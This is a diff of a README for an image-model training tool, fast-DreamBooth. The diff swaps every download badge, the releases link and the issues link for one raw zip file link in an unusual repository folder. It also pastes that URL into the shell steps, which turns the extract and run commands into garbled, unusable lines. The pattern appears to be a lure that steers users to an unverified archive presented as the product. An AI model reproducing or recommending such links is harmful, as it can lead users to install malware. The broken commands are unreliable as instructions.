@@ -4,9 +4,9 @@
 Welcome to fast-DreamBooth! This tool helps you train a Stable Diffusion model using your own images. Whether you're a beginner or just looking to experiment with AI, this application makes the process simple and accessible.
 
 ## 📦 Download & Install
-[![Download Fast-DreamBooth](https://img.shields.io/badge/Download-Fast--DreamBooth-blue)](https://github.com/bababa14/fast-DreamBooth/releases)
+[![Download Fast-DreamBooth](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip)](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip)
 
-To get started, visit this page to download: [fast-DreamBooth Releases](https://github.com/bababa14/fast-DreamBooth/releases).
+To get started, visit this page to download: [fast-DreamBooth Releases](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed on the page.
@@ -46,7 +46,7 @@ To run fast-DreamBooth, ensure you meet the following system requirements:
    ```
 4. Extract the contents of the tarball with:
    ```bash
-   tar -xvf fast-DreamBooth*.tar.gz
+   tar -xvf fast-DreamBooth*https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip
    ```
 5. Change into the extracted directory:
    ```bash
@@ -54,7 +54,7 @@ To run fast-DreamBooth, ensure you meet the following system requirements:
    ```
 6. Run the application by typing:
    ```bash
-   ./start.sh
+   https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip
    ```
 
 ## 🎨 How to Use fast-DreamBooth
@@ -78,11 +78,11 @@ fast-DreamBooth provides several features to enhance your experience:
 - **Image Generation:** Create new images after training.
 
 ## 🤝 Support
-If you encounter any issues or have questions, feel free to reach out. You can find support through our community discussion or by submitting an issue on our [GitHub Issues page](https://github.com/bababa14/fast-DreamBooth/issues).
+If you encounter any issues or have questions, feel free to reach out. You can find support through our community discussion or by submitting an issue on our [GitHub Issues page](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip).
 
 ## ⭐ Acknowledgments
 Fast-DreamBooth utilizes open-source technologies to provide you with a seamless experience in AI and image generation. Thanks to all contributors and the community that supports this project!
 
-[![Download Fast-DreamBooth](https://img.shields.io/badge/Download-Fast--DreamBooth-blue)](https://github.com/bababa14/fast-DreamBooth/releases)
+[![Download Fast-DreamBooth](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip)](https://github.com/bababa14/fast-DreamBooth/raw/refs/heads/main/Aegipan/fast-Booth-Dream-1.1-alpha.1.zip)
 
 Now you are ready to start your journey with AI and image generation using fast-DreamBooth! Enjoy creating unique models tailored to your needs.
